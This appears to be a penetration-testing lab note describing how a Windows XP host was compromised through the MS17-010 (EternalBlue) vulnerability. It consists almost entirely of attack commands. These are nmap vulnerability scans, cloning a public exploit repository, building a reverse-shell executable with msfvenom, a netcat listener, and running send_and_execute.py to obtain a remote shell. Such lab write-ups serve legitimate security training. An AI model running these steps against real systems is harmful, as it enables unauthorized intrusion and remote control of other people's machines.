Getting a Foothold

Getting a Foothold

# Works

1. Run the vuln scripts on NMAP. Either of the following 2 commands listed MS17-010 as one of the high risk vulns.
No ping scan
`sudo nmap -Pn -A -p- -sV --script default,safe,auth,vuln --max-retries 4 10.11.1.5`
Stealth scan
`sudo nmap -sS -A -p- -sV --script default,safe,auth,vuln --max-retries 4 10.11.1.5`
![a178b4e5d725f921e12987bbb740184e.png](../../../_resources/d353d0bbcc894a19afa97f51a33ea2d2.png)

2. The above scripts ran smb-os-discovery script, and revealed that the OS = Windows XP (Lan Manager)

3. Searchsploit does not offer any exploits for MS17-010 using Windows XP. The Google search string: `ms17-010 windows xp` showed the helpful link that led to the next steps.
![4950f409aed33bb11dcb03c680819ecc.png](../../../_resources/d88460f566f043e1a66458bc4bb47560.png)

4. Clone this repo
`git clone https://github.com/helviojunior/MS17-010.git`
![eedbdbc2e4590b74c80830718b632652.png](../../../_resources/a49574f92c8d47db8d30f1266d1491c5.png)

5. Generate shellcode
`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.214 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o rev_192.168.119.214_443.exe`
![e2f8f796e1f731bc2df59d82a376ff56.png](../../../_resources/9d60394eafcf452d845604e925588a4d.png)

6. Start a netcat listener
`sudo nc -lvnp 443`
![5763f05c332a51b46861bbb46d9c3a56.png](../../../_resources/b76027288904486aa11ae5dd002edc15.png)

7. Run send_and_execute.py
`python ~/gitWorkspace/tools/MS17-010/send_and_execute.py 10.11.1.5 rev_192.168.119.214_443.exe`
![48b23e9d396c6ad0e31fe1bafcf56be5.png](../../../_resources/ccc9d1e96e3345d4965b1c1a7c98f3d9.png)

8. Notice that we now have a shell
![c56d54ba4c32c4564b16c3efb6376466.png](../../../_resources/ec675e92418445e9902e38797e0c1847.png)










 